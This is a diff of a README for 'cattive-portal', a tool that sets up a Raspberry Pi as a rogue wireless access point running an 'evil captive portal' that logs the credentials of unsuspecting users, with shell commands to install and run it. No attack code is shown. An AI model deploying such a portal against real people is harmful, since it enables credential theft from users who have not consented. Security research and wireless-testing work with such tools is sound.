@@ -1,16 +1,16 @@
 # *cattive-portal*
-An evil captive portal designed to work on a Raspberry Pi set up as an indipendent wireless AP.
+Sets up your Raspberry Pi as an indipendent wireless AP and runs an evil captive portal which logs the credentials of the unsuspicious users.
 
 ## How to
-Install Flask with:
+To set up the AP and make the portal run at boot, enter:
 
-    pip install flask
+    sh install.sh
 
-Set up the portal by editing the configuration file:
+To stop the AP and use the Pi as a WiFi client (it will restart as an AP anyway), enter:
 
-    nano portal.conf
+    sh stop.sh
 
-Start the web-app:
+To manage the AP by yourself and just run the captive portal web-app, enter:
 
     python portal.py
 
